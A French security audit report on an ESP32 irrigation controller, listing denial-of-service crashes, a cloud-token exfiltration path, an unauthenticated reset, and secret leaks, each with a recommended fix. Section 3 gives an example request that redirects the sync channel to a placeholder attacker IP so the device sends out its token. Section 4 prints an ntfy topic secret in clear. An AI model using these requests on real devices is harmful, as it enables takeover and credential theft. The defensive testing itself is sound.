# Rapport de robustesse réseau — AquaLook

**Date de campagne** : nuit du 3 au 4 septembre 2026
**Cible** : module ESP32-S3 `192.168.1.141` (banc d'essai, sans relais raccordé), firmware 5.9.7 build 1028
**Règle du jeu** : attaques par le WiFi/HTTP uniquement. Le port série n'a servi qu'à **lire** l'état et capturer les traces de plantage, jamais comme vecteur.
**Périmètre** : le module seul. L'ancienne carte de production (`.156`) et le serveur mutualisé AlwaysData ont été explicitement épargnés (hébergement partagé : le marteler nuirait à des tiers).

---

## Synthèse

Le module a **encaissé la quasi-totalité des entrées hostiles** sans broncher : parseur JSON solide, bornes d'index rejetées, aucun fichier secret servi, aucune traversée de chemin, mot de passe WiFi jamais divulgué, configuration intacte après plus de quatre plantages provoqués, **aucune fuite mémoire** sur 7 000 requêtes et 4 heures.

Deux faiblesses réelles ressortent, toutes deux de la **même cause racine** — la tâche réseau `async_tcp` peut être privée de CPU au-delà des 5 s du chien de garde, ce qui fait redémarrer le module. Elles sont atteignables sans authentification depuis le réseau local. S'y ajoutent des points de divulgation de secrets, cohérents avec le trou d'authentification assumé en conception, dont un mérite correction rapide.

| # | Sévérité | Défaut | État |
|---|----------|--------|------|
| 1 | **Élevée** | URI géante (≥ ~16 Ko) → redémarrage (watchdog `async_tcp`) | Confirmé (live + série) |
| 2 | **Élevée** | Tempête de connexions (30 parallèles) → même redémarrage | Confirmé (live + série) |
| 3 | Moyenne | Jeton d'appairage cloud exfiltrable en redirigeant le canal sortant | Confirmé par le code |
| 4 | Moyenne | Sujet ntfy renvoyé en clair par `/api/notifications` | Confirmé (live) |
| 5 | Moyenne | `/api/resetConfig` : réinitialisation d'usine sans authentification | Confirmé par le code |
| 6 | Faible | Masquage laissant fuir les 4 premiers caractères des secrets | Confirmé (live) |
| 7 | Faible | `z=` non numérique lu comme zone 0 au lieu d'un rejet | Confirmé (live) |

---

## Défauts détaillés

### 1. Déni de service par URI géante — redémarrage watchdog

**Preuve.** Une requête `GET` unique dont le chemin fait 16 Ko fait redémarrer le module. Seuil mesuré : **8 Ko passe, 16 Ko tombe**.

```
GET /AAAA…(16384 octets)… HTTP/1.1
→ uptime 1642 s → 9 s, resetReason = "watchdog tache"
```

**Cause racine**, isolée sur la trace série :

```
[E][vfs_api.cpp:105] open(): /littlefs/AAAA…(16 Ko)
E task_wdt: Task watchdog got triggered:
 - async_tcp (CPU 1) did not reset the watchdog in time
abort() → panic_abort → RTC_SW_CPU_RST
```

Le serveur de fichiers statiques (`serveStatic("/", LittleFS, "/")`) prend le chemin de l'URI **tel quel** et tente d'ouvrir `/littlefs/<tout le chemin>` comme un fichier. Sur un chemin de 16 Ko, l'opération LittleFS — plus l'impression des 16 Ko sur la console série (~1,4 s à elle seule) — bloque la tâche `async_tcp` au-delà de la fenêtre de 5 s du chien de garde de tâche, qui déclenche un `panic`.

**Impact.** Un seul paquet, non authentifié, redémarre le contrôleur d'arrosage. Répété, il maintient le module hors service.

### 2. Déni de service par tempête de connexions — même redémarrage

**Preuve.** 300 requêtes `GET /api/status` réparties sur 30 fils simultanés : 54 réussies, 246 échouées en 81 s, puis redémarrage.

```
E task_wdt: Task watchdog got triggered:
 - async_tcp (CPU 1) did not reset the watchdog in time
Tasks currently running: CPU 0: IDLE0   CPU 1: loopTask
```

**Cause racine.** La tâche `async_tcp` et la boucle applicative `loopTask` partagent le **cœur 1**. Sous la charge des 30 connexions, `loopTask` monopolise le cœur, `async_tcp` ne s'exécute plus assez pour nourrir son chien de garde → `panic`. C'est le même mode de défaillance que le défaut n°1, atteint par la contention CPU plutôt que par une opération bloquante.

**À noter — la résilience joue.** Quatre redémarrages rapprochés ont fait basculer le module en **mode dégradé** (`BootLoopGuard`, seuil 4), qui suspend les fonctions de confort (météo) pour casser une éventuelle boucle de démarrage. C'est le comportement voulu ; c'est aussi la mesure de l'impact du DoS : quatre reboots forcés neutralisent les décisions d'arrosage météo. La récupération est propre : `POST /api/bootguard/clear` lève le mode dégradé et la météo reprend immédiatement.

### 3. Exfiltration du jeton cloud par redirection du canal sortant

**Confirmé par lecture du code**, non exécuté en direct (l'action reconfigure le canal de production et a été refusée par la couche de sécurité de l'agent — comportement correct).

`handleSetCloudSync` lit `token = doc["token"] | current.token` : un attaquant change **`host`/`port`/`useHttps` sans connaître le jeton**, et le module continue d'envoyer le sien. La validation accepte `useHttps:false` vers une adresse **privée** (RFC 1918). Il suffit donc de :

```
POST /api/cloudSync {"host":"<IP attaquant>","port":<p>,"useHttps":false}
```

pour qu'au cycle suivant (≤ 1 min) le module poste vers l'hôte de l'attaquant avec `Authorization: Bearer <jeton complet>`. Ce jeton permet d'usurper le module auprès du serveur (télémétrie et configuration falsifiées, sauvegarde empoisonnée).

Le même schéma vaut pour le jeton ntfy (ici vide, donc sans effet).

### 4. Sujet ntfy divulgué en clair

`GET /api/notifications` (sans authentification) renvoie :

```json
{"enabled":true,"server":"http://ntfy.sh","topic":"acquaE7PggnQw9pXi7LLn9c",…}
```

Sur ntfy.sh, **le nom du sujet est le secret** : quiconque le connaît lit toutes les notifications d'arrosage et d'incident, et peut injecter de fausses alertes. Il transite d'ailleurs déjà en clair à chaque envoi (canal HTTP volontairement conservé) — mais l'exposer par l'API le rend trivialement récupérable.

### 5. `/api/resetConfig` sans authentification

`POST /api/resetConfig` (sans authentification ni confirmation) déclenche `resetPersistent()` : effacement de la configuration, mot de passe WiFi compris. N'importe quel appareil du réseau local peut réinitialiser le module aux valeurs d'usine et le sortir du réseau.

### 6. Masquage laissant fuir un préfixe

`/api/adminStatus` masque le jeton cloud, la clé OWM et (via `/api/notifications`) le jeton ntfy en **révélant leurs 4 premiers caractères** (`c6b4****`, `5e65****`). Faible en soi, mais réduit l'espace de recherche et n'apporte rien à l'utilisateur qui a déjà « configuré : oui ».

### 7. Conversion silencieuse d'un index invalide

`GET /api/zone?z=abc`, `z=` (vide) ou `z=0x10` renvoient la **zone 0** au lieu d'un `400`, la conversion `toInt()` d'une chaîne non numérique valant 0. Sans gravité (lecture seule, index valide), mais entrée mal validée.

---

## Ce qui a tenu bon

- **Parseur JSON** : imbrication profonde (3 000 niveaux) → `400` sans débordement de pile ; corps de 100 Ko → **`413`** (limite de taille appliquée, pas d'épuisement mémoire) ; `NaN`/`Infinity`, chaîne de format `%s%n`, JSON tronqué, scalaire, octets nuls → tous `400`. Aucun plantage.
- **Bornes d'écriture** : `zone:255`, `zone:-1`, jour/créneau hors plage → tous `400`. La validation d'index tient.
- **Fichiers et traversée** : `/config.json`, `/../`, `%2e%2e`, `.env` → `404`. Aucun fichier secret servi.
- **Mot de passe WiFi** : jamais renvoyé par une API, jamais journalisé, non répercuté en écho par le handler d'écriture.
- **Intégrité de la configuration** : intacte (CRC NVS valide) après plus de quatre plantages provoqués — zones, planning, fournisseur météo tous préservés.
- **Mémoire** : sur 7 000 requêtes et 4 heures, **aucune fuite**. Le heap oscille en dents de scie entre ~200 Ko et ~132 Ko (pic transitoire périodique du fetch météo) et **revient à ~200 Ko à chaque cycle**. Plancher observé sur la nuit : 102 Ko, bien au-dessus du seuil de 45 Ko exigé avant un fetch.
- **Slowloris** : 30 connexions à en-têtes au compte-gouttes retenues 20 s — module resté joignable.
- **Résilience** : `BootLoopGuard` compte les plantages, bascule en mode dégradé au 4ᵉ, se réarme après 3 min d'uptime stable, et se lève proprement sur commande explicite.
- **En-tête HTTP géant** (64 Ko), méthodes inconnues, absence de `Host`, `Content-Length` négatif/absurde, requêtes en pipeline : tous encaissés (redirection captive, `400`, `404` ou fermeture propre), sans redémarrage.

---

## Recommandations de correctif

1. **Borner la longueur du chemin de requête** en amont du serveur de fichiers : rejeter d'un `414` toute URL au-delà d'une taille raisonnable (par ex. 512 octets) avant que `serveStatic` ne tente l'ouverture LittleFS. Corrige le n°1.
2. **Découpler la tâche réseau de la boucle applicative** : exécuter `async_tcp` sur le cœur 0 (hors de `loopTask`), ou alléger/fractionner les handlers lourds. Corrige le n°2.
3. **N'émettre le jeton cloud que sur HTTPS** : ne pas attacher l'en-tête `Authorization` quand `useHttps` est faux. La validation de certificat empêche alors toute capture par redirection. Corrige le n°3.
4. **Masquer le sujet ntfy** dans `/api/notifications` (présence + longueur, sans le contenu), et réduire les masques à « configuré : oui/non » sans préfixe en clair. Corrige les n°4 et n°6.
5. **Protéger `/api/resetConfig`** par une confirmation explicite dans le corps, en attendant la couche d'authentification prévue. Atténue le n°5.
6. **Rejeter un `z` non numérique** par un `400`. Corrige le n°7.

Les correctifs 1 à 4 sont les plus rentables : ils ferment les deux dénis de service et la principale voie d'exfiltration.

---

## Méthode et outillage

Tout est reproductible depuis les scripts de la campagne :

- `fuzz.py` — abus du protocole HTTP (URI/en-têtes géants, `Content-Length` malformés, pipeline) et charge (slowloris, tempête de connexions).
- `fuzz2.py` — fuzzing du parseur JSON et des bornes d'index, sur les routes non destructrices uniquement.
- `health_poll.py` — veilleur HTTP indépendant (uptime, `resetReason`, plancher de heap), témoin des plantages.
- `serial_watch.py` — mouchard série en lecture seule, capture des traces `abort()`/`task_wdt` avec leur pile.
- `endurance.py` — trafic séquentiel doux sur la nuit, recherche de fuite mémoire lente.

Les routes destructrices ont été **exclues par construction** du fuzzing : `/api/wifi` (redémarrage + perte du réseau), `/api/resetConfig`, `/api/cloudSync` (canal de production), `/api/webassets/update`, `/api/debug/deploy-*`, `/api/manual`.
